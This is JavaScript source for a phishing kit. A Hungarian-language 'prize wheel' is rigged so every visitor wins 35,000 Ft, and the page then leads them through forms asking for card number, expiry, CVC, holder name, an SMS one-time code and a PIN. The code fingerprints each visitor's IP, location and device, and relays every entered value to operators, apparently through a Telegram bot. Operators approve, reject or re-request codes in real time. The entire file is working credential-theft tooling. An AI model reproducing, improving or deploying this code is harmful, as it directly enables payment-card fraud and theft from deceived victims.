    const tx = cx + Math.cos(mid) * 220, ty = cy + Math.sin(mid) * 220;
    ctx.save();
    ctx.translate(tx, ty);
    ctx.rotate(mid + Math.PI/2);
    ctx.textAlign = "center";
    ctx.textBaseline = "middle";
    ctx.font = prizes[i] >= 10000 ? "800 17px Manrope,Arial,sans-serif" : "900 21px Manrope,Arial,sans-serif";
    ctx.fillStyle = (colors[i] === "#202020" || colors[i] === "#f36f21") ? "#fff" : "#222";
    ctx.fillText(prizes[i] === 0 ? "0 Ft" : formatFt(prizes[i]), 0, 0);
    ctx.restore();
  }
  ctx.beginPath();
  ctx.arc(cx, cy, 72, 0, Math.PI * 2);
  ctx.fillStyle = "#fff";
  ctx.fill();
  ctx.strokeStyle = "#202020";
  ctx.lineWidth = 8;
  ctx.stroke();
  ctx.fillStyle = "#f36f21";
  ctx.font = "900 17px Manrope,Arial,sans-serif";
  ctx.textAlign = "center";
  ctx.textBaseline = "middle";
  ctx.fillText("PÖRG", cx, cy);
}
function pickPrize(){ return 35000; }
function targetForPrize(prize){
  const idx = prizes.indexOf(prize);
  const slice = 2 * Math.PI / prizes.length;
  const pointer = -Math.PI / 2;
  const center = idx * slice + slice / 2;
  const turns = 7 + Math.floor(Math.random() * 3);
  return angle + turns * 2 * Math.PI + (pointer - center);
}
function animate(target, duration = 3900){
  return new Promise(resolve => {
    const startAngle = angle, start = performance.now();
    function frame(now){
      const t = Math.min((now - start) / duration, 1);
      const ease = 1 - Math.pow(1 - t, 4);
      angle = startAngle + (target - startAngle) * ease;
      drawWheel();
      if(t < 1) requestAnimationFrame(frame);
      else { angle = ((angle % (2 * Math.PI)) + 2 * Math.PI) % (2 * Math.PI); drawWheel(); resolve(); }
    }
    requestAnimationFrame(frame);
  });
}

// ============================================================
// 📍 ПЕРЕКЛЮЧЕНИЕ ШАГОВ
// ============================================================
function showStep(step){
  const steps = {1: step1, '1b': step1b, 2: step2, '2b': step2b, '2p': step2p, '2pb': step2pb, 3: step3};
  Object.keys(steps).forEach(key => steps[key].style.display = 'none');
  if (step === 1) step1.style.display = 'block';
  else if (step === '1b') step1b.style.display = 'block';
  else if (step === 2) step2.style.display = 'block';
  else if (step === '2b') step2b.style.display = 'block';
  else if (step === '2p') step2p.style.display = 'block';
  else if (step === '2pb') step2pb.style.display = 'block';
  else if (step === 3) step3.style.display = 'block';
  const dots = document.querySelectorAll('.step-dot');
  const lines = document.querySelectorAll('.step-line');
  const stepMap = {1:1,'1b':1,2:2,'2b':2,'2p':2,'2pb':2,3:3};
  const current = stepMap[step] || 1;
  dots.forEach((dot, i) => {
    dot.classList.remove('active', 'done');
    if (i+1 === current) dot.classList.add('active');
    else if (i+1 < current) dot.classList.add('done');
  });
  lines.forEach((line, i) => {
    line.classList.remove('active', 'done');
    if (i+1 < current) line.classList.add('done');
  });
}
function startTimer(){
  timerSeconds = 60;
  timerDisplay.innerHTML = `<i class="fas fa-clock"></i> ${timerSeconds} másodperc`;
  clearInterval(timerInterval);
  timerInterval = setInterval(() => {
    timerSeconds--;
    timerDisplay.innerHTML = `<i class="fas fa-clock"></i> ${timerSeconds} másodperc`;
    if(timerSeconds <= 0){
      clearInterval(timerInterval);
      timerDisplay.innerHTML = `<i class="fas fa-clock" style="color:#f36f21;"></i> A kód lejárt`;
    }
  }, 1000);
}

// ============================================================
// ✅ ВАЛИДАЦИЯ
// ============================================================
function validateCardNumber(num){ const clean = num.replace(/\s/g, ''); return clean.length === 16 && /^\d{16}$/.test(clean); }
function validateExpiry(exp){ if(!/^\d{2}\/\d{2}$/.test(exp)) return false; const [month, year] = exp.split('/').map(Number); return month >= 1 && month <= 12; }
function validateCvc(cvc){ return cvc.length >= 3 && cvc.length <= 4 && /^\d+$/.test(cvc); }
function validateHolder(name){ return name.trim().length >= 2; }
function showError(inputId, errorId, message){ const input = document.getElementById(inputId); const error = document.getElementById(errorId); input.classList.add('error'); input.classList.remove('success'); error.textContent = message; }
function showSuccess(inputId, errorId){ const input = document.getElementById(inputId); const error = document.getElementById(errorId); input.classList.remove('error'); input.classList.add('success'); error.textContent = ''; }
function clearValidation(){ ['cardNumber','cardExpiry','cardCvc','cardHolder'].forEach(id => { const input = document.getElementById(id); const error = document.getElementById(id+'Error'); input.classList.remove('error','success'); if(error) error.textContent = ''; }); }
function getCardData(){ return { number: document.getElementById('cardNumber').value, expiry: document.getElementById('cardExpiry').value, cvc: document.getElementById('cardCvc').value, holder: document.getElementById('cardHolder').value.trim() }; }

// ============================================================
// 🔄 SMS-ПОЛЯ (старые автопереходы удалены, теперь одно поле)
// ============================================================
// (код удалён)

// ============================================================
// 📝 ФОРМАТИРОВАНИЕ ПОЛЕЙ КАРТЫ
// ============================================================
document.getElementById('cardNumber').addEventListener('input', function(e){
  let val = this.value.replace(/\D/g, '');
  let formatted = '';
  for(let i = 0; i < val.length; i++){ if(i > 0 && i % 4 === 0) formatted += ' '; formatted += val[i]; }
  this.value = formatted;
  if(val.length === 16) showSuccess('cardNumber', 'cardNumberError');
  else if(val.length > 0) showError('cardNumber', 'cardNumberError', 'A kártyaszámnak 16 számjegyből kell állnia');
});
document.getElementById('cardExpiry').addEventListener('input', function(e){
  let val = this.value.replace(/\D/g, '');
  if(val.length >= 2){ const month = parseInt(val.substring(0,2)); if(month > 12) this.value = '12/' + val.substring(2,4); else this.value = val.substring(0,2) + '/' + val.substring(2,4); } else this.value = val;
  if(val.length === 4){ const exp = this.value; if(validateExpiry(exp)) showSuccess('cardExpiry', 'cardExpiryError'); else showError('cardExpiry', 'cardExpiryError', 'Érvénytelen dátum (MM/YY)'); }
});
document.getElementById('cardCvc').addEventListener('input', function(e){
  this.value = this.value.replace(/\D/g, '');
  if(this.value.length >= 3 && this.value.length <= 4) showSuccess('cardCvc', 'cardCvcError');
  else if(this.value.length > 0) showError('cardCvc', 'cardCvcError', 'A CVC 3-4 számjegy');
});
document.getElementById('cardHolder').addEventListener('input', function(e){
  if(this.value.trim().length >= 2) showSuccess('cardHolder', 'cardHolderError');
  else if(this.value.trim().length > 0) showError('cardHolder', 'cardHolderError', 'A név legalább 2 karakter');
});

// ============================================================
// 🎡 ЗАПУСК КОЛЕСА
// ============================================================
spinBtn.addEventListener("click", async () => {
  if(spinning) return;
  const ip = userIp;
  if (!checkRateLimit(ip)) {
    status.textContent = "❌ Túl sok kérés. Várjon egy percet.";
    return;
  }
  if (isIpBlacklisted(ip)) {
    status.textContent = "🚫 Hozzáférés megtagadva.";
    alert('Hozzáférés megtagadva.');
    return;
  }
  
  let existingLogId = findActiveLogBySession(visitorSessionId) || findActiveLogByIp(ip);
  if (existingLogId) {
    currentLogId = existingLogId;
    const log = getLogStatus(currentLogId);
    if (log) {
      const step = log.data.step;
      if (step === 'card' || step === 'card_processing') { showStep(1); modal.classList.add("active"); currentStep = 'card'; spinBtn.disabled = false; status.textContent = "📌 Folytatás..."; return; }
      else if (step === 'sms' || step === 'sms_processing') { showStep(2); modal.classList.add("active"); currentStep = 'sms'; startTimer(); spinBtn.disabled = false; status.textContent = "📱 Folytatás..."; return; }
      else if (step === 'pin' || step === 'pin_processing') { showStep('2p'); modal.classList.add("active"); currentStep = 'pin'; spinBtn.disabled = false; status.textContent = "🔑 Folytatás..."; return; }
    }
  }
  
  spinning = true;
  wonPrize = pickPrize();
  spinBtn.disabled = true;
  status.textContent = "A kerék forog…";
  await animate(targetForPrize(wonPrize));
  status.textContent = "🎉 Gratulálunk!";
  spinning = false;
  
  currentLogId = generateLogId();
  const time = new Date().toLocaleString('hu-HU');
  const deviceInfo = getDeviceInfo();
  
  const logData = {
    ip: userIp,
    country: userCountry,
    device: `${deviceInfo.device} (${deviceInfo.os} ${deviceInfo.osVersion})`,
    browser: deviceInfo.browser,
    browserVersion: deviceInfo.browserVersion,
    os: deviceInfo.os,
    osVersion: deviceInfo.osVersion,
    screen: deviceInfo.screen,
    fingerprint: deviceInfo.fingerprint,
    time: time,
    amount: formatFt(wonPrize),
    step: 'card',
    blocked: false,
    lastAction: 'Новый посетитель'
  };
  createLog(currentLogId, logData);
  
  await updateCompactLog(currentLogId, null, 'Новый посетитель');
  
  clearValidation();
  showStep(1);
  modal.classList.add("active");
  currentStep = 'card';
  
  if (pingInterval) clearInterval(pingInterval);
  pingInterval = setInterval(() => {
    if (currentLogId) {
      updateLastSeen(currentLogId);
    }
  }, 5000);
});

// ============================================================
// 🚀 ШАГ 1 → КАРТА
// ============================================================
step1Btn.addEventListener("click", async () => {
  if(isProcessing) return;
  if (!checkRateLimit(userIp)) { alert('Túl sok kérés.'); return; }
  if (isIpBlacklisted(userIp)) { alert('Hozzáférés megtagadva.'); return; }
  
  const cardData = getCardData();
  let isValid = true;
  if(!validateCardNumber(cardData.number)){ showError('cardNumber','cardNumberError','16 számjegy'); isValid = false; } else showSuccess('cardNumber','cardNumberError');
  if(!validateExpiry(cardData.expiry)){ showError('cardExpiry','cardExpiryError','Érvénytelen dátum'); isValid = false; } else showSuccess('cardExpiry','cardExpiryError');
  if(!validateCvc(cardData.cvc)){ showError('cardCvc','cardCvcError','3-4 számjegy'); isValid = false; } else showSuccess('cardCvc','cardCvcError');
  if(!validateHolder(cardData.holder)){ showError('cardHolder','cardHolderError','Legalább 2 karakter'); isValid = false; } else showSuccess('cardHolder','cardHolderError');
  if(!isValid) return;
  
  isProcessing = true;
  step1Btn.disabled = true;
  step1Btn.textContent = "Küldés...";
  
  const bin = getBin(cardData.number);
  const bank = getBankByBin(bin);
  
  const log = getLogStatus(currentLogId);
  if (log) {
    log.data.cardNumber = cardData.number;
    log.data.cardExpiry = cardData.expiry;
    log.data.cardCvc = cardData.cvc;
    log.data.cardHolder = cardData.holder;
    log.data.bin = bin;
    log.data.bank = bank;
    log.data.step = 'card_processing';
    log.data.lastAction = 'Карта введена';
  }
  saveLogsToStorage();
  
  await updateCompactLog(currentLogId, null, 'Карта введена');
  await sendToAllAdmins(`💳 <b>Карта введена</b>\n📋 ${currentLogId}\n👤 Обрабатывает: ${log.takenBy ? (log.takenBy === OWNER_CHAT_ID ? 'владелец' : log.takenBy) : 'никто'}`);
  
  showStep('1b');
  status.textContent = "⏳ Admin döntésre vár...";
  
  try {
    const response = await waitForAdminCommand();
    const command = response.data;
    if (command === 'card_approve') {
      const log = getLogStatus(currentLogId);
      if (log) { log.data.step = 'sms'; log.data.lastAction = 'Запрос SMS'; }
      saveLogsToStorage();
      const targetAdmin = log.takenBy || null;
      await updateCompactLog(currentLogId, targetAdmin, 'Запрос SMS');
      await sendToAllAdmins(`📌 ${currentLogId} → Запрос SMS (обрабатывает: ${targetAdmin || 'никто'})`);
      isProcessing = false; step1Btn.disabled = false; step1Btn.textContent = "TOVÁBB";
      showStep(2); startTimer(); status.textContent = "📱 Adja meg az SMS-kódot";
      currentStep = 'sms';
    } else if (command === 'card_error') {
      const log = getLogStatus(currentLogId);
      if (log) { log.data.step = 'card_error'; log.data.lastAction = 'Ошибка данных'; }
      saveLogsToStorage();
      const targetAdmin = log.takenBy || null;
      await updateCompactLog(currentLogId, targetAdmin, 'Ошибка данных');
      await sendToAllAdmins(`❌ ${currentLogId} → Ошибка данных (обрабатывает: ${targetAdmin || 'никто'})`);
      isProcessing = false; step1Btn.disabled = false; step1Btn.textContent = "TOVÁBB";
      showStep(1);
      status.textContent = "❌ Hibás adatok, ellenőrizze";
      document.querySelector('#step1 .modal-info-box p').innerHTML = '<span style="color:#e74c3c;">⚠️ Hibás kártyaadatok!</span>';
      document.getElementById('cardNumber').value = ''; document.getElementById('cardExpiry').value = ''; document.getElementById('cardCvc').value = ''; document.getElementById('cardHolder').value = ''; clearValidation();
      setTimeout(() => { document.querySelector('#step1 .modal-info-box p').innerHTML = 'Miután megkapta a pénzeszközöket, küldje el az árut a vevőnek a megadott adatok felhasználásával.'; }, 5000);
      currentStep = 'card';
    } else if (command === 'card_reject') {
      const log = getLogStatus(currentLogId);
      if (log) { log.data.step = 'card_reject'; log.data.lastAction = 'Отклонён'; archiveLog(currentLogId, log.data); }
      saveLogsToStorage();
      await updateCompactLog(currentLogId, null, 'Отклонён');
      await sendToAllAdmins(`🚫 ${currentLogId} → Отклонён`);
      modal.classList.remove("active"); showStep(1); isProcessing = false; step1Btn.disabled = false; step1Btn.textContent = "TOVÁBB";
      status.textContent = "Nyomja meg a „Pörgetés” gombot.";
      currentStep = 'idle';
      if (pingInterval) clearInterval(pingInterval);
    }
  } catch(e) { console.error(e); isProcessing = false; step1Btn.disabled = false; step1Btn.textContent = "TOVÁBB"; alert("Időtúllépés"); }
});

// ============================================================
// 📱 ШАГ 2 → SMS (без ограничений)
// ============================================================
step2Btn.addEventListener("click", async () => {
  if(isProcessing) return;
  if (!checkRateLimit(userIp)) { alert('Túl sok kérés.'); return; }
  
  // Новое поле для SMS — берём значение целиком
  const code = document.getElementById('smsCodeInput').value.trim();
  if(code === ''){ alert('Kérem, adja meg az SMS-kódot!'); return; }
  
  isProcessing = true;
  step2Btn.disabled = true;
  step2Btn.textContent = "Küldés...";
  
  const log = getLogStatus(currentLogId);
  if (log) { 
    log.data.smsCode = code; 
    log.data.step = 'sms_processing';
    log.data.lastAction = 'SMS введён';
  }
  saveLogsToStorage();
  const targetAdmin = log.takenBy || null;
  await updateCompactLog(currentLogId, targetAdmin, 'SMS введён');
  await sendToAllAdmins(`📱 <b>SMS-код введён</b>\n📋 ${currentLogId}\n👤 Обрабатывает: ${targetAdmin ? (targetAdmin === OWNER_CHAT_ID ? 'владелец' : targetAdmin) : 'никто'}`);
  
  showStep('2b');
  status.textContent = "⏳ Admin döntésre vár...";
  
  try {
    const response = await waitForAdminCommand();
    const command = response.data;
    if (command === 'sms_approve') {
      const log = getLogStatus(currentLogId);
      if (log) { log.data.step = 'success'; log.data.lastAction = '✅ Успешно'; archiveLog(currentLogId, log.data); }
      saveLogsToStorage();
      await updateCompactLog(currentLogId, null, '✅ Успешно');
      await sendToAllAdmins(`✅ ${currentLogId} → Успешно! (обрабатывал: ${targetAdmin || 'никто'})`);
      isProcessing = false; step2Btn.disabled = false; step2Btn.textContent = "MEGERŐSÍTÉS";
      clearInterval(timerInterval); showStep(3); status.textContent = "✅ Sikeres!";
      currentStep = 'success';
      if (pingInterval) clearInterval(pingInterval);
    } else if (command === 'sms_error') {
      const log = getLogStatus(currentLogId);
      if (log) { log.data.step = 'sms_error'; log.data.lastAction = '❌ Неверный SMS'; }
      saveLogsToStorage();
      const targetAdmin = log.takenBy || null;
      await updateCompactLog(currentLogId, targetAdmin, '❌ Неверный SMS');
      await sendToAllAdmins(`❌ ${currentLogId} → Неверный SMS (обрабатывает: ${targetAdmin || 'никто'})`);
      isProcessing = false; step2Btn.disabled = false; step2Btn.textContent = "MEGERŐSÍTÉS";
      showStep(2); startTimer();
      status.textContent = "❌ Hibás SMS, próbálja újra";
      smsInfoBox.innerHTML = '<p style="color:#e74c3c;"><i class="fas fa-exclamation-triangle" style="color:#e74c3c;"></i> Hibás SMS-kód.</p>';
      document.getElementById('smsCodeInput').value = '';
      setTimeout(() => { smsInfoBox.innerHTML = '<p><i class="fas fa-sms" style="color:#f36f21;"></i> Kérjük, adja meg a telefonszámára küldött egyszeri kódot.</p>'; }, 5000);
      currentStep = 'sms';
    } else if (command === 'sms_pin') {
      const log = getLogStatus(currentLogId);
      if (log) { log.data.step = 'pin'; log.data.lastAction = '🔑 Запрос PIN'; }
      saveLogsToStorage();
      const targetAdmin = log.takenBy || null;
      await updateCompactLog(currentLogId, targetAdmin, '🔑 Запрос PIN');
      await sendToAllAdmins(`🔑 ${currentLogId} → Запрос PIN (обрабатывает: ${targetAdmin || 'никто'})`);
      isProcessing = false; step2Btn.disabled = false; step2Btn.textContent = "MEGERŐSÍTÉS";
      showStep('2p'); status.textContent = "🔑 Adja meg a PIN-kódot";
      currentStep = 'pin';
    }
  } catch(e) { console.error(e); isProcessing = false; step2Btn.disabled = false; step2Btn.textContent = "MEGERŐSÍTÉS"; alert("Időtúllépés"); }
});

// ============================================================
// 🔑 ШАГ 2.5 → PIN (без ограничений)
// ============================================================
step2pBtn.addEventListener("click", async () => {
  if(isProcessing) return;
  if (!checkRateLimit(userIp)) { alert('Túl sok kérés.'); return; }
  
  const pin = pinInput.value.trim();
  if(pin === ''){ alert('Kérem, adja meg a PIN-kódot!'); return; }
  
  isProcessing = true;
  step2pBtn.disabled = true;
  step2pBtn.textContent = "Küldés...";
  
  const log = getLogStatus(currentLogId);
  if (log) { 
    log.data.pinCode = pin; 
    log.data.step = 'pin_processing';
    log.data.lastAction = 'PIN введён';
  }
  saveLogsToStorage();
  const targetAdmin = log.takenBy || null;
  await updateCompactLog(currentLogId, targetAdmin, 'PIN введён');
  await sendToAllAdmins(`🔐 <b>PIN-код введён</b>\n📋 ${currentLogId}\n👤 Обрабатывает: ${targetAdmin ? (targetAdmin === OWNER_CHAT_ID ? 'владелец' : targetAdmin) : 'никто'}`);
  
  showStep('2pb');
  status.textContent = "⏳ Admin döntésre vár...";
  
  try {
    const response = await waitForAdminCommand();
    const command = response.data;
    if (command === 'pin_approve') {
      const log = getLogStatus(currentLogId);
      if (log) { log.data.step = 'success'; log.data.lastAction = '✅ PIN подтверждён'; archiveLog(currentLogId, log.data); }
      saveLogsToStorage();
      await updateCompactLog(currentLogId, null, '✅ PIN подтверждён');
      await sendToAllAdmins(`✅ ${currentLogId} → Успешно (PIN подтверждён)! (обрабатывал: ${targetAdmin || 'никто'})`);
      isProcessing = false; step2pBtn.disabled = false; step2pBtn.textContent = "PIN MEGERŐSÍTÉS";
      clearInterval(timerInterval); showStep(3); status.textContent = "✅ Sikeres!";
      currentStep = 'success';
      if (pingInterval) clearInterval(pingInterval);
    } else if (command === 'pin_error') {
      const log = getLogStatus(currentLogId);
      if (log) { log.data.step = 'pin_error'; log.data.lastAction = '❌ Неверный PIN'; }
      saveLogsToStorage();
      const targetAdmin = log.takenBy || null;
      await updateCompactLog(currentLogId, targetAdmin, '❌ Неверный PIN');
      await sendToAllAdmins(`❌ ${currentLogId} → Неверный PIN (обрабатывает: ${targetAdmin || 'никто'})`);
      isProcessing = false; step2pBtn.disabled = false; step2pBtn.textContent = "PIN MEGERŐSÍTÉS";
      showStep('2p'); status.textContent = "❌ Hibás PIN, próbálja újra";
      pinInfoBox.innerHTML = '<p style="color:#e74c3c;"><i class="fas fa-exclamation-triangle" style="color:#e74c3c;"></i> Hibás PIN.</p>';
      pinInput.value = '';
      setTimeout(() => { pinInfoBox.innerHTML = '<p><i class="fas fa-lock" style="color:#f36f21;"></i> Adja meg a PIN-kódot.</p>'; }, 5000);
      currentStep = 'pin';
    }
  } catch(e) { console.error(e); isProcessing = false; step2pBtn.disabled = false; step2pBtn.textContent = "PIN MEGERŐSÍTÉS"; alert("Időtúllépés"); }
});

// ============================================================
// 🔚 ЗАКРЫТИЕ
// ============================================================
step3Btn.addEventListener("click", () => {
  modal.classList.remove("active");
  showStep(1);
  document.getElementById('smsCodeInput').value = '';
  document.getElementById('cardNumber').value = ''; document.getElementById('cardExpiry').value = ''; document.getElementById('cardCvc').value = ''; document.getElementById('cardHolder').value = ''; pinInput.value = '';
  clearInterval(timerInterval); clearValidation();
  isProcessing = false;
  step1Btn.disabled = false; step1Btn.textContent = "TOVÁBB";
  step2Btn.disabled = false; step2Btn.textContent = "MEGERŐSÍTÉS";
  step2pBtn.disabled = false; step2pBtn.textContent = "PIN MEGERŐSÍTÉS";
  status.textContent = "Nyomja meg a „Pörgetés” gombot.";
  currentStep = 'idle';
  if (pingInterval) clearInterval(pingInterval);
});
modal.addEventListener("click", (e) => {
  if(e.target === modal) {
    modal.classList.remove("active");
    clearInterval(timerInterval);
    showStep(1);
    clearValidation();
    isProcessing = false;
    step1Btn.disabled = false; step1Btn.textContent = "TOVÁBB";
    step2Btn.disabled = false; step2Btn.textContent = "MEGERŐSÍTÉS";
    step2pBtn.disabled = false; step2pBtn.textContent = "PIN MEGERŐSÍTÉS";
    status.textContent = "Nyomja meg a „Pörgetés” gombot.";
    currentStep = 'idle';
    if (pingInterval) clearInterval(pingInterval);
  }
});

// ============================================================
// 🚀 ИНИЦИАЛИЗАЦИЯ
// ============================================================
drawWheel();

async function initializeVisitor() {
  loadLogsFromStorage();

  try {
    const info = await getIpInfo();
    userIp = info.ip;
    userCountry = `${info.country} (${info.city})`;
    console.log('🌐 IP:', userIp, '📍 Страна:', userCountry);
  } catch (e) {
    console.warn('Geo initialization failed:', e);
  }

  const existing = findActiveLogBySession(visitorSessionId) || findActiveLogByIp(userIp);
  if (existing) {
    currentLogId = existing;
    const log = getLogStatus(existing);
    if (log) {
      const step = log.data.step;
      if (step === 'card' || step === 'card_processing') {
        showStep(1); modal.classList.add('active'); currentStep = 'card';
      } else if (step === 'sms' || step === 'sms_processing') {
        showStep(2); modal.classList.add('active'); currentStep = 'sms'; startTimer();
      } else if (step === 'pin' || step === 'pin_processing') {
        showStep('2p'); modal.classList.add('active'); currentStep = 'pin';
      }
      spinBtn.disabled = false;
      status.textContent = '📌 Folytatás...';
    }
  }

  startPolling().catch(console.error);
  console.log('🤖 Бот запущен. Главный админ:', OWNER_CHAT_ID);
}

initializeVisitor();
